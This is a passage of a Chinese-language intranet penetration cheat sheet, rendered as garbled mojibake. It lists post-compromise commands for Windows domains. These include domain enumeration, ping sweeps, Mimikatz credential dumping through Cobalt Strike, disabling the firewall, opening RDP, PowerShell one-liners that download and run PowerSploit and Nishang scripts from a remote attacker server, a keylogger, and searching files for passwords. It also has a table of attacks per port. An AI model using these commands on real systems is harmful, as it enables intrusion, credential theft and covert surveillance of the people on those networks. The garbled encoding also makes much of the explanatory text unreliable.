è¿™é‡Œä¸çŸ¥ä¸ºä½•æˆ‘æ‰¾ä¸åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œæˆ–è®¸æ˜¯å‘½ä»¤é”™è¯¯ï¼Œæ‰¾äº†åŠå¤©å‘ç°æ˜¯åŸŸåå‰é¢åº”è¯¥æ˜¯ä¸¤æ¡åæ–œæ  3.24 æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨ net group \"domain computers\" /domain 3.25 è·å–åŸŸä¿¡ä»»ä¿¡æ¯ nltest /domain_trusts 3.26 è·å–åŸŸå†…ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ wmic useraccount get /all 3.27 æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ· dsquery user è¿™æ¡å‘½ä»¤åªèƒ½åœ¨winserveræœåŠ¡å™¨æ‰èƒ½ä½¿ç”¨ 3.28 æŸ¥è¯¢æ‰€æœ‰è®¡ç®—æœºåç§° dsquery computer 3.29 æ”»å‡»ä¸»æœºCMDæ‰«æåŒç½‘æ®µå­˜æ´»ip windows # æ‰«cæ®µ for /L %P in (1,1,254) DO @ping â€w 1 â€n 1 192.168.17.%P | findstr \"TTL =\" Linux #!/bin/bash NET=10.168.1. for IP in {100..115} do if `ping -c2 -i0.2 -w2 $NET$IP &amp;&gt; /dev/null` then echo -e \"$NET$IP is \\033[31mup\\033[0m\" else echo -e \"$NET$IP is \\033[32mdown\\033[0m\" fi done æ‰«bæ®µ for i in 192.168.{1..254}.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null;then echo $i is alived; fi; done 3.30 PowerView.psåŸŸå†…ä¿¡æ¯æ”¶é›† Invoke-NetView //æŸ¥åŸŸå†…ç¯å¢ƒ Invoke-ShareFinder //æŸ¥å…±äº«ç›®å½• Invoke-MapDomainTrusts //æŸ¥çœ‹åŸŸå†…ä¿¡ä»»å…³ç³» Get-NetLocalGroup -HostName TARGET(ä¸»æœºå) //æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„ç™»å½•æ—¶é—´ã€æ‰€å±ç»„æƒ…å†µ 3.31 csä¿¡æ¯æ”¶é›† targetç»„ä¿¡æ¯çš„å‘½ä»¤ net group \\Target net localgroup \\target ç»„å è·å–è¿œç¨‹ç›®å½• shell dir \\target\\c$ shell dir /S /B \\target\\c$\\users //é€’å½’è·å–å¤šçº§ç›®å½•åŠæ–‡ä»¶ csé€šè¿‡powershellå‘½ä»¤è·å–ç›®å½•ä¿¡æ¯ powersehll Invoke-Command -ComputerName target -ScriptBlock{dir c:} powershell Invoke-Command -ComputerName target -ScriptBlock{net localgroup administrators} csé€šè¿‡mimikatzæŠ“å–è¿œç¨‹å“ˆå¸Œå€¼ powershell-import Invoke-Mimikatz.ps1 powershell Invoke-Mimikatz -DumpCreds powershell Invoke-Mimikatz -Command â€˜â€œprivilege::debugâ€ â€œsekurlsa::logonPasswords fullâ€â€˜ 3.32 é˜²ç«å¢™ç›¸å…³ å…³é—­é˜²ç«å¢™ Windows Server 2003åŠä¹‹å‰çš„ç‰ˆæœ¬(admin)ï¼š netsh firewall set opmode disable Windows Server 2003ä¹‹åçš„ç‰ˆæœ¬(admin)ï¼š netsh advfirewall set allprofiles state off æŸ¥çœ‹é˜²ç«å¢™é…ç½®ï¼š netsh firewall show config ä¿®æ”¹é˜²ç«å¢™é…ç½® Windows Server 2003åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ï¼š netsh firewall add allowedprogram c: c.exe \"allow nc\" enable Windows Server 2003ä¹‹åçš„ç‰ˆæœ¬ï¼Œæƒ…å†µå¦‚ä¸‹ã€‚ å…è®¸æŒ‡å®šç¨‹åºè¿›å…¥ï¼š netsh advfirewall firewall add rule name=\"pass nc\" dir=in action=allow program=\"C: c.exe\" å…è®¸æŒ‡å®šç¨‹åºé€€å‡ºï¼š netsh advfirewall firewall add rule name=\"Allow nc\" dir=out action=allow program=\"C: c.exe\" å…è®¸3389ç«¯å£æ”¾è¡Œï¼š netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å‚¨å­˜ä½ç½® netsh advfirewall set currentprofile logging filename \"C:\\windows\\temp\\fw.log\" 3.33 æŸ¥è¯¢ä»£ç†é…ç½®æƒ…å†µ reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" 3.34 æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡ æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£ 0xd3dè½¬æ¢åå°±æ˜¯3389 REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber åœ¨Windows Server 2003ä¸­å¼€å¯3389ç«¯å£ wmic path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1 åœ¨Windows Server 2008å’ŒWindows Server 2012ä¸­å¼€å¯3389ç«¯å£ wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 3.35 ç«¯å£æ‰«æ 1. telnetç«¯å£è¿æ¥ æ²¡æœ‰å¼€å¯çš„è¯å»â€œæ‰“å¼€æˆ–å…³é—­windowsåŠŸèƒ½â€å¼€å¯ telnetåªç”¨äºç¡®è®¤ç«¯å£æ˜¯å¦å¼€å¯ç”¨ï¼Œä¸æ‹¿æ¥ç«¯å£æ‰«æ telnet &lt;ä¸»æœº&gt; &lt;ç«¯å£&gt; telnet 192.168.52.138 445 2. PowerSploit ä¸­çš„Invoke-portscan.ps1è„šæœ¬ ä¸‹è½½åœ°å€ï¼šhttps://github.com/PowerShellMafia/PowerSploit ç«¯å£æ‰«æåˆ©ç”¨åˆ°å·¥å…·åŒ…ä¸­çš„Portscan.ps1 powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/powersploit/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.17.1/24 -T 4 -ports '445,1433,8080,80,3389'\" // æˆ–è€…æ‰«æå…¨éƒ¨çš„ç«¯å£ï¼š-Ports \"1-65535\" 3. Nishangä¸­çš„Invoke-portscan.ps1 ä¸‹è½½åœ°å€ï¼šhttps://github.com/samratashok/nishang è¯¥è„šæœ¬å¯ç”¨äºå‘ç°ä¸»æœºã€è§£æä¸»æœºåã€æ‰«æç«¯å£ã€‚ powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port '1-65535'\" // -ResolveHostï¼šè§£æä¸»æœºå 4. Nmapæ‰«æ ä¸€èˆ¬é€šè¿‡æŒ‚ä»£ç†ï¼Œnmapè¿œç¨‹æ‰«æ ã€Šå†…ç½‘æ¸—é€æµ‹è¯•ï¼šéšè—é€šè®¯éš§é“æŠ€æœ¯ã€‹ 5. Metasploit ç«¯å£æ‰«ææ¨¡å— Metasploitä¸­æä¾›äº†å¾ˆå¤šå†…ç½®çš„æ‰«ææ¨¡å—ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œåœ¨ä¾µå…¥å†…ç½‘åè®¾ç½®å¥½è·¯ç”±ç›´æ¥æ‰«å³å¯ï¼Œæœ‰æ—¶é€Ÿåº¦æœ‰äº›æ…¢ã€‚å‡ ä¸ªå¸¸ç”¨çš„ï¼š auxiliary/scanner/portscan/tcp auxiliary/scanner/portscan/tcp auxiliary/scanner/portscan/ack 6. æ”¶é›†åŸŸå†…ç«¯å£çš„bannerä¿¡æ¯ bannerä¿¡æ¯è¡¨ç¤ºâ€œæ¬¢è¿è¯­â€ï¼Œå…¶ä¸­ä¼šåŒ…å«ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œåœ¨bannerä¿¡æ¯ä¸­ï¼Œå¯ä»¥è·å–åˆ°è½¯ä»¶å¼€å‘å•†ã€è½¯ä»¶åç§°ã€æœåŠ¡ç±»å‹ã€ç‰ˆæœ¬å·ç­‰ï¼Œè€Œç‰ˆæœ¬å·ä¿¡æ¯æœ‰æ—¶ä¼šå­˜åœ¨å…¬å¼€çš„CVEå¯ä»¥åˆ©ç”¨ã€‚è·å–åˆ°ç‰ˆæœ¬å·åï¼Œå¯ä»¥åœ¨ä¸­æŸ¥æ‰¾åˆ°å¯¹åº”çš„CVEç¼–å·ï¼Œå¹¶åœ¨ExploitDBç­‰å¹³å°ä¸Šé¢æ‰¾åˆ°ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ã€‚ è·å–Banner æ‰«æåˆ°ç«¯å£åå°±è¦è·å–åˆ°å…¶Bannerä¿¡æ¯ï¼Œæ¥ç€å°±å¯ä»¥åœ¨æ¼æ´åº“é‡ŒæŸ¥æ‰¾pocï¼Œè¿™ä¸ªå¯ä»¥æ‰¾ä¸€ä¸‹å¸¸è§çš„ç«¯å£çš„æœåŠ¡æ¥å¾—çŸ¥ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æŠ€å·§ 21/22/69 ftp/tftpï¼šæ–‡ä»¶ä¼ è¾“åè®® å…è®¸åŒ¿åä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´ã€å—…æ¢ã€æº¢å‡ºå’Œåé—¨ 22 sshï¼šè¿œç¨‹è¿æ¥ çˆ†ç ´OpenSSHï¼›28ä¸ªé€€æ ¼ 23 telnetï¼šè¿œç¨‹è¿æ¥ çˆ†ç ´\\å—…æ¢ã€å¼±å£ä»¤ 25 smtpï¼šé‚®ä»¶æœåŠ¡ é‚®ä»¶ä¼ªé€  53 DNSï¼šåŸŸåç³»ç»Ÿ DNSåŒºåŸŸä¼ è¾“\\DNSåŠ«æŒ\\DNSç¼“å­˜æŠ•æ¯’\\DNSæ¬ºéª—\\åˆ©ç”¨DNSéš§é“æŠ€æœ¯åˆºé€é˜²ç«å¢™ 67/68 dhcp åŠ«æŒ\\æ¬ºéª— 80/443/8080 å¸¸è§webæœåŠ¡ç«¯å£ webæ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´ 110 pop3 çˆ†ç ´ã€å—…æ¢ 139 samba çˆ†ç ´\\æœªæˆæƒè®¿é—®\\è¿œç¨‹ä»£ç æ‰§è¡Œ 143 imap çˆ†ç ´ 161 snmp çˆ†ç ´ 389 ldapç›®å½•è®¿é—®åè®® æ³¨å…¥æ”»å‡»\\æœªæˆæƒè®¿é—®ï¼Œå¼±å£ä»¤ 512/513/514 linux rexec ç›´æ¥ä½¿ç”¨rlogin\\çˆ†ç ´ 873 rsync æœªæˆæƒè®¿é—®\\æ–‡ä»¶ä¸Šä¼  1080 socket çˆ†ç ´ï¼šè¿›è¡Œå†…ç½‘æ¸—é€ 1352 lotus Dominoé‚®ä»¶æœåŠ¡ çˆ†ç ´ï¼šå¼±å£ä»¤\\ä¿¡æ¯æ³„æ¼ï¼šæºä»£ç  1433 mssql çˆ†ç ´ï¼šä½¿ç”¨ç³»ç»Ÿç”¨æˆ·ç™»å½•\\æ³¨å…¥æ”»å‡»\\SAå¼±å£ä»¤ 1521 oracle çˆ†ç ´ï¼šTNS\\æ³¨å…¥æ”»å‡»\\åå¼¹shell 2049 nfs é…ç½®ä¸å½“ 2181 zookeeper æœªæˆæƒè®¿é—® 3306 mysql çˆ†ç ´\\æ‹’ç»æœåŠ¡\\æ³¨å…¥\\ææƒ 3389 rdp çˆ†ç ´\\Shiftåé—¨ 3690 SVNæœåŠ¡ SVNæ³„éœ²\\æœªæˆæƒè®¿é—® 4848 glassfish çˆ†ç ´ï¼šæ§åˆ¶å°å¼±å£ä»¤\\è®¤è¯ç»•è¿‡ 5000 sybase/DB2 çˆ†ç ´\\æ³¨å…¥ 5432 postgresql ç¼“å†²åŒºæº¢å‡º\\æ³¨å…¥æ”»å‡»\\çˆ†ç ´ï¼šå¼±å£ä»¤ 5632 pcanywhere æ‹’ç»æœåŠ¡\\ä»£ç æ‰§è¡Œï¼ŒæŠ“å–å¯†ç  5900 vnc çˆ†ç ´ï¼šå¼±å£ä»¤\\è®¤è¯ç»•è¿‡ 6379 redis æœªæˆæƒè®¿é—®\\çˆ†ç ´ï¼šå¼±å£ä»¤ 7001/7002 weblogic Javaååºåˆ—åŒ–\\æ§åˆ¶å°å¼±å£ä»¤\\æ§åˆ¶å°éƒ¨ç½²webshell 8069 zabbix è¿œç¨‹å‘½ä»¤æ‰§è¡Œ\\SQLæ³¨å…¥ 8080/8089 JBoss/Resin/Jetty/Jenkins ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤ 9090 websphereæ§åˆ¶å° çˆ†ç ´ï¼šæ§åˆ¶å°å¼±å£ä»¤\\Javaååºåˆ— 9200/9300 elasticsearch è¿œç¨‹ä»£ç æ‰§è¡Œ 10000 webminæ§åˆ¶é¢æ¿ å¼±å£ä»¤ 11211 memcacache æœªæˆæƒè®¿é—® 27017/27018 mongodb çˆ†ç ´\\æœªæˆæƒè®¿é—® 50000 SAP Management Console è¿œç¨‹æ‰§è¡Œ 7. ä½¿ç”¨Nmapè·å–banner nmap &lt;IPåœ°å€&gt; --script=banner -p &lt;ç«¯å£/ç«¯å£èŒƒå›´&gt; æˆ‘è¿™é‡Œæ²¡bannerï¼Œå°±å€Ÿç”¨å›¾ç‰‡äº† 8. ä½¿ç”¨ncè·å–banner nc -nv &lt;IPåœ°å€&gt; &lt;ç«¯å£&gt; 3.36 å­˜æ´»ä¸»æœºæ‰«æ nbtscan nbtscan.exeæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæ‰«ææœ¬åœ°æˆ–è¿œç¨‹TCP/IPç½‘ç»œä¸Šçš„å¼€æ”¾NetBIOSåç§°æœåŠ¡å™¨ã€‚ ä¸‹è½½åœ°å€ï¼šhttps://github.com/MrAnonymous-1/nbtscan å°†nbtscan.exeä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šï¼Œç„¶åç›´æ¥è¾“å…¥ipæ®µå³å¯è¿è¡Œæ‰«æï¼š //æ‰«æä¸€ä¸ªç½‘æ®µ nbtscan-1.0.35.exe 192.168.17.0/24 //æ‰«æä¸¤ä¸ªç½‘æ®µ nbtscan.exe 192.168.1.0/24 192.168.2.0/24 å‚æ•°è§£é‡Šï¼š SHARINGï¼šè¯¥ä¸»æœºå­˜åœ¨æ­£åœ¨è¿è¡Œçš„æ–‡ä»¶å’Œæ‰“å°å…±äº«æœåŠ¡ DCï¼šè¯¥æœºå™¨å¯èƒ½æ˜¯åŸŸæ§åˆ¶å™¨ ?ï¼šæ²¡æœ‰è¯†åˆ«å¤„è¯¥æœºå™¨çš„NetBIOSèµ„æº ping åŸºäºicmpæ‰«æå†…ç½‘ for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.17.%I | findstr \"TTL=\" //å…¼å®¹win7 for /l %i in (1,1,254) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i \"Ping\" //æ‰«bæ®µ for /l %i in (1,1,254) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i \"Ping\" arp-scan.exe åŸºäºarpåè®®æ¥è¿›è¡Œå­˜æ´»æ€§æ‰«æ é¡¹ç›®åœ°å€ï¼šhttps://github.com/QbsuranAlang/arp-scan-windows- è¿™ä¸ªå·¥å…·çš„é€Ÿåº¦æ¯”ä¸Šä¸€ä¸ªå¿«å¾ˆå¤š æ‰¹å¤„ç†è„šæœ¬ è¿™ä¸ªæ‰¹å¤„ç†æ–‡ä»¶å¯ç”¨äºå¯¹å†…ç½‘å·¥ä½œç»„å’ŒåŸŸå†…å­˜æ´»ä¸»æœºè¿›è¡Œç®€å•çš„æ‰«ææ¢æµ‹ï¼Œå¹¶ä¸”æ”¯æŒä¸­è‹±æ–‡æ“ä½œç³»ç»Ÿã€‚ @echo off @echo. @FOR /F \"usebackq delims=, \" %%J IN (`net view /domain ^|find \"å‘½ä»¤æˆåŠŸå®Œæˆ\" /v ^|find \"The command completed successfully.\" /v ^|find \"å‘½ä»¤æˆåŠŸå®Œæˆ\" /v ^|find \"--\" /v ^|find \"Domain\" /v ^|find \"\" /v ^|find \"ã‚³ãƒãƒ³ãƒ‰ã¯æ­£å¸¸ã«çµ‚äº†ã—ã¾ã—ãŸ\" /v /i`) do ( @echo ====== Domain:%%J ========= @FOR /F \"usebackq eol=; delims=, \" %%i in (`net view /domain:%%J ^|findstr \"\\\\\"`) do ( @FOR /F \"usebackq eol=; tokens=1,2,3* delims=\\\\\" %%a in (`@echo %%i`) do ( ping %%a -4 -n 1 -w 100 |find /i \"ping\" &gt; %%a.txt @FOR /F \"tokens=2 delims=[]\" %%b in (%%a.txt) do @echo \\\\%%a = [%%b] @del /f /q %%a.txt ))) @echo ====== Getting IP Complete ====== msfä¸»æœºå­˜æ´»æ‰«æ auxiliary/scanner/discovery/udp_sweep auxiliary/scanner/discovery/udp_probe auxiliary/scanner/netbios/nbname MSFå»ºç«‹ä¼šè¯æ‹¿åˆ°shellï¼Œå³å¯ç›´æ¥æ‰§è¡ŒDOSå‘½ä»¤è‡³ä»Šè¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚ä¹Ÿå¯ä»¥è¿›è¡Œç›´æ¥æ‰§è¡Œrun winenumå¯ä»¥ä¸€é”®æ”¶é›†è®°å½•ã€‚ run winenum 3.37 å®šä½åŸŸç®¡ç†å‘˜ psloggeddon.exe ä¸‹è½½åœ°å€ï¼šhttps://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon psloggedon.exeå¯ä»¥æŸ¥çœ‹æœ¬åœ°ç™»é™†çš„ç”¨æˆ·å’Œé€šè¿‡æœ¬åœ°è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºèµ„æºç™»é™†çš„ç”¨æˆ·ã€‚å¦‚æœæŒ‡å®šçš„æ˜¯ç”¨æˆ·åè€Œä¸æ˜¯æœºå™¨åï¼Œpsloggedon.exeä¼šæœç´¢ç½‘ä¸Šé‚»å±…ä¸­çš„æ‰€æœ‰è®¡ç®—æœºï¼Œå¹¶æ˜¾ç¤ºè¯¥ç”¨æˆ·æ˜¯å¦å·²ç»ç™»å½•ã€‚è¯¥å·¥å…·çš„æŸäº›åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚ psloggedon.exe [-] [-l] [-x] [\\\\computernameæˆ–username] æŸ¥çœ‹DC(åŸŸæ§)ç™»å½•è¿‡çš„æœºå™¨ PsLoggedon64.exe -accepteula \\\\DC æŸ¥çœ‹æœ¬åœ°ç™»å½•çš„ç”¨æˆ· PsLoggedon64.exe -accepteula æŸ¥çœ‹æŒ‡å®šç”¨æˆ·ç™»å½•çš„è®¡ç®—æœº PsLoggedon64.exe -accepteula Administrator PVEFindADUser.exe ä¸‹è½½åœ°å€ï¼šhttps://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/ PVEFindADUser.exe å¯ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»é™†çš„ä½ç½®ã€æšä¸¾åŸŸç”¨æˆ·ï¼Œä»¥åŠæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»é™†çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æŸ¥æ‰¾æœ¬åœ°ç”¨æˆ·ã€‚é€šè¿‡RDPè¿œç¨‹æ¡Œé¢ç™»é™†çš„ç”¨æˆ·ã€é€šè¿‡è¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚è¿è¡Œè¯¥å·¥å…·éœ€è¦è®¡ç®—æœºé…ç½®**.NET Framework 2.0 ç¯å¢ƒ**ï¼Œå¹¶éœ€è¦æœ‰ç®¡ç†å‘˜æƒé™ã€‚ PVEFindADUser.exe &lt;å‚æ•°&gt; æˆ‘ä»¬ä¸€èˆ¬ç›´æ¥è¿è¡ŒPVEFindADUser.exe -currentå‘½ä»¤ï¼Œå³å¯æ˜¾ç¤ºåŸŸä¸­æ‰€æœ‰è®¡ç®—æœºä¸Šå½“å‰ç™»é™†çš„æ‰€æœ‰ç”¨æˆ·ã€‚ æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·ç™»å½•çš„è®¡ç®—æœº current[â€œusernameâ€] å¦‚æœä»…æŒ‡å®šäº†-currentå‚æ•°ï¼Œå°†è·å–ç›®æ ‡è®¡ç®—æœºä¸Šå½“å‰ç™»å½•çš„æ‰€æœ‰ç”¨æˆ·ã€‚å¦‚æœæŒ‡å®šäº†ç”¨æˆ·å(Domain\\Username)ï¼Œåˆ™æ˜¾ç¤ºè¯¥ç”¨æˆ·ç™»é™†çš„è®¡ç®—æœº PVEFindADUser.exe -current redteam.org\\dc //PVEFindADUser.exe -current domain\\username powerview.ps1 powerviewè„šæœ¬å¯ä»¥ç”¨æ¥è·å–å½“å‰åŸŸç®¡ç†å‘˜åœ¨çº¿ç™»å½•çš„æœåŠ¡å™¨ï¼Œå…¶ä¾èµ–powershellå’Œwmiï¼Œåœ¨powersploitå·¥å…·åŒ…ä¸­ï¼Œæ˜¯ä¸€ä¸ªæ”¶é›†åŸŸä¿¡æ¯å¾ˆå¥½ç”¨çš„è„šæœ¬ã€‚ Invoke-UserHunterï¼š**æœç´¢æœ¬åœ°åŸŸä¸­åŸŸç®¡ç†å‘˜å½“å‰åœ¨çº¿çš„ä¸»æœºï¼Œå¹¶éªŒè¯å½“å‰ç”¨æˆ·æ˜¯å¦å…·æœ‰å¯¹è¿™äº›ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™ã€‚**å®ƒå¯ä»¥ä½¿ç”¨ Get-NetSessions å’ŒGet-NetLoggedon æ‰«ææ¯å°æœåŠ¡å™¨å¹¶å¯¹æ‰«æç»“æœè¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œæ‰¾å‡ºç›®æ ‡ç”¨æˆ·é›†ï¼Œå¹¶ä¸”æ— éœ€ç®¡ç†å‘˜æƒé™ã€‚ å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æœ¬åœ°åŸŸæœ‰ä¸€ä¸ªåŸŸç®¡ç†å‘˜ï¼š net group \"domain controllers\" /domain æˆ‘ä»¬é€šè¿‡Invoke-UserHunterï¼ˆç­‰äºInvoke-UserHunter -CheckAccess)æ¥å®šä½ä»–ä»¬ï¼š powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1');Invoke-UserHunter è¯¦æƒ…è¯·æ‰§è¡ŒGet-Help Invoke-UserHunterå‘½ä»¤æŸ¥çœ‹ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•ä¸å‰ä¸¤ä¸ªç›¸ä¼¼ï¼Œå®ƒå¯ä»¥æ‰¾åˆ°åŸŸå†…ç‰¹å®šçš„ç”¨æˆ·ç¾¤ï¼Œæ¥å—ç”¨æˆ·åã€ç”¨æˆ·åˆ—è¡¨å’ŒåŸŸç»„åˆ—è¡¨æŸ¥è¯¢ï¼Œæ¥å—ä¸€ä¸ªä¸»æœºåˆ—è¡¨æˆ–æŸ¥è¯¢å¯ç”¨çš„ä¸»æœºåŸŸåã€‚ä¸€åˆ‡éƒ½æ˜¯çµæ´»çš„ï¼Œè®©ä½ è‡ªå·±å®šä¹‰æ‰¾å¯»è°ï¼Œåœ¨å“ªé‡Œæ‰¾ã€‚ è·å–æŒ‡å®šç”¨æˆ·åœ¨çº¿æœºå™¨ï¼š 3.38 Empireä¿¡æ¯æ”¶é›† # æŸ¥çœ‹æœ¬æœºç”¨æˆ·ã€åŸŸç»„æˆå‘˜ã€å¯†ç è®¾ç½®æ—¶é—´ã€å‰ªè´´æ¿å†…å®¹ã€ç³»ç»ŸåŸºæœ¬ä¿¡æ¯ã€ç½‘ç»œé€‚é…å™¨ä¿¡æ¯ã€å…±äº«ä¿¡æ¯ç­‰ usemodule situation_awareness/host/winenum # ç›®æ ‡ä¸»æœºäº‹ä»¶æ—¥å¿—ã€åº”ç”¨ç¨‹åºæ§åˆ¶ç­–ç•¥æ—¥å¿—ã€RDPç™»å½•ä¿¡æ¯ã€PowerShellè„šæœ¬è¿è¡Œå’Œä¿å­˜çš„ä¿¡æ¯ç­‰ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ usemodule situational_awareness/host/computerdetails 3.39 powersploit ä¿¡æ¯æ”¶é›† é¡¹ç›®åœ°å€ï¼šhttps://github.com/PowerShellMafia/PowerSploit ï¼Œå·²ç»åœæ­¢ç»´æŠ¤ å»ºç«‹ä¼šè¯åçš„meterpreterï¼š #åŠ è½½æ¨¡å— load powershell #è°ƒç”¨æœ¬åœ°psè„šæœ¬ powershell_import /usr/share/windows-resources/powersploit/Recon/xx.ps1 #å‘½ä»¤æ‰§è¡Œ powershell_execute Get-NetDomain #è·å–å½“å‰çš„åŸŸåç§° Get-NetDomain #è¿”å›æ‰€æœ‰åŸŸå†…æˆå‘˜çš„è¯¦ç»†ä¿¡æ¯ Get-Netuser #è·å–æ‰€æœ‰çš„åŸŸå†…çš„æ§åˆ¶å™¨ä¿¡æ¯ Get-NetDomainController #è·å–æ‰€æœ‰åŸŸå†…æœºå™¨çš„åç§° Get-NetComputer #è·å–åŸŸå†…çš„æ‰€æœ‰çš„ç½‘ç»œå…±äº« Get-Netshare #è·å–æŒ‡å®šæœåŠ¡çš„è¿œç¨‹è¿æ¥ä¿¡æ¯ Get-NetRDPSESSION #è·å–è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ Get-NetProcess # è·å–æ´»åŠ¨ç›®å½•çš„ä¿¡æ¯ Get-ADOPJECT #åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»é™†è®¡ç®—æœºä¸”ç”¨æˆ·æ˜¯å¦æœ‰ç®¡ç†å‘˜æƒé™ invoke-processhunter powersploitæ— æ–‡ä»¶æ”»å‡» å°†ä¸‹è½½çš„æ–‡ä»¶æ”¾åœ¨vpsä¸Šé¢ã€‚ç¡®ä¿ç›®æ ‡æœåŠ¡å™¨å¯ä»¥è®¿é—®ï¼š å¦‚ï¼šhttp://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1 #åœ¨ç›®æ ‡æœºå¯¼å…¥è„šæœ¬ï¼š iex(new-object net.webclient).downloadstring(\"http://192.168.1.4/PowerSploit/Recon/Invoke-Portscan.ps1\") #æ‰«æç½‘æ®µã€ç«¯å£ invoke-portscan -hosts 192.168.1.1/24 -ports \"21,22,80,139,80,445\" #invoke-mimikatzæŠ“å–hash iex(new-object net.webclient).downloadstring(\"http://192.168.1.4/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1\") #å¯¼hash Invoke-Mimikatz -dumpcreds #get-keystrokesé”®ç›˜è®°å½• iex(new-object net.webclient).downloadstring(\"http://192.168.1.4/PowerSploit/Exfiltration/Get-Keystrokes.ps1\") #å°†é”®ç›˜è®°å½•ä¿å­˜åˆ°123.txté‡Œé¢ Get-Keystrokes -logpath C:\\Users\\admin\\123.txt 3.40 ç¿»ç¿»é…ç½®æ–‡ä»¶ ä¸€ä¸ªæ­£å¸¸çš„Webåº”ç”¨è‚¯å®šæœ‰å¯¹åº”çš„æ•°æ®åº“è´¦å·å¯†ç ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯»æ‰¾åŒ…å«å¯†ç å­—æ®µçš„æ–‡ä»¶ï¼š findstr /s /m \"password\" *.* findstr /s /i /m /r \"defineclass remoteserver\" Webç›®å½• \\*.jsp # /r è¡¨ç¤ºæ­£åˆ™ï¼Œ/sè¡¨ç¤ºéå†å­ç›®å½•ï¼Œ/mè¡¨ç¤ºä¸æ˜¾ç¤ºåŒ¹é… LinuxæŸ¥æ–‡ä»¶ï¼š find Webåº”ç”¨ç›®å½• -iname \"*.jsp*\" | xargs egrep -l -i \"classloader\" |xargs egrep -l -i \"cipher\" find Webåº”ç”¨ç›®å½• -iname \"*.php*\" | xargs egrep -l -i \"openssl_decrypt\" |xargs egrep -l -i \"file_get_contents\" æ•æ„Ÿè·¯å¾„ %WINDIR% %WINDIR%\\system32\\ %TEMP% %LOCALAPPDATA% %APPDATA% C:\\TEMP\\ C:\\Windows\\Temp %UserProfile%\\Downloads %UserProfile%\\Recent C:\\$Recycle.bin å¸¸ç”¨åº”ç”¨çš„é»˜è®¤é…ç½®è·¯å¾„ï¼š Tomcat: CATALINA_HOME/conf/tomcat-users.xml Apache: /etc/httpd/conf/httpd.conf Nginx: /etc/nginx/nginx.conf Wdcp: /www/wdlinux/wdcp/conf/mrpw.conf Mysql: mysql\\data\\mysql\\user.MYD è¿˜æœ‰ä¸€äº›Navicat,TeamViewer,FileZilla,WinSCP,Xmangagerç³»åˆ—äº§å“ï¼ˆXshell,Xftp)çš„å¯†ç æŸ¥çœ‹ é¡¹ç›®: https://github.com/uknowsec/SharpDecryptPwd 3.41 BloodHoundåŸŸåˆ†æå·¥å…· 